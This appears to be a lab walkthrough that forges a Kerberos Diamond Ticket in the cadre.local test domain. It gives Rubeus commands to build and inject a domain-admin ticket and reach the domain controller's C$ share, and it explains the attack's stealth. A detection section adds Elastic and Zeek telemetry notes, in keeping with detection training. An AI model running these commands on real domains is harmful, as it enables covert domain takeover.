# WT#012 — Diamond Ticket

## Metadata

| Field | Value |
|-------|-------|
| **Target VM** | dc01 (192.168.77.10), cadre.local |
| **Domain** | cadre.local |
| **Starting Credential** | krbtgt AES256 key (from DCSync — WT#009) |
| **Tools Required** | Rubeus (Windows), impacket-ticketer (Linux alternative) |
| **Certifications** | CRTE |
| **MITRE ATT&CK** | T1558.001 |
| **Difficulty** | Hard |

## Prerequisites

- krbtgt AES256 key (obtained via DCSync — WT#009)
- Domain SID of `cadre.local`
- Access to a domain-joined Windows machine (or kali with modified ticketer)
- Server 2025 environment (AES keys required for stealth)

## Attack Steps

### Step 1: Extract krbtgt AES256 key from DCSync output

```bash
cat cadre_dcsync.ntds | grep krbtgt
# Extract the AES256 key from the output
```

### Step 2: Exploit — Forge a Diamond Ticket with Rubeus

```powershell
# On a Windows domain-joined machine (e.g., mbr01):
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /krbkey:<krbtgt_AES256_key> /nowrap
```

### Step 3: Verify — Use the forged ticket

```powershell
# Pass the ticket in the same session
Rubeus.exe asktgs /ticket:<base64_diamond_ticket> /service:cifs/dc01.cadre.local /ptt
# Access the DC
ls \\dc01.cadre.local\C$
```

## Post-Exploitation Chain

- **Forged TGT with legitimate timestamps** (not a new TGT — a modified legitimate one)
- **Stealthier than Golden Ticket** — bypasses TGT anomaly detection
- **Same persistence as Golden Ticket** — access any resource as any user
- **Preferred on Server 2025** where AES-only krbtgt keys make Golden Ticket anomalies more visible

## Telemetry Verification

- **Elastic Index:** `logs-system.security-*`
- **Detection Rule:** No dedicated rule — harder to detect than Golden Tickets because the TGT was originally legitimate
- **Expected Event:** Event ID 4768 (if a new TGT is requested from the forged ticket), but the initial forged ticket itself generates no audit event
- **Note:** Diamond Tickets modify an existing TGT rather than creating a new one, making them significantly stealthier. Detection requires Kerberos traffic analysis (Zeek) comparing PAC signatures or TGT issuance timestamps

## Status

POST-EXPLOIT
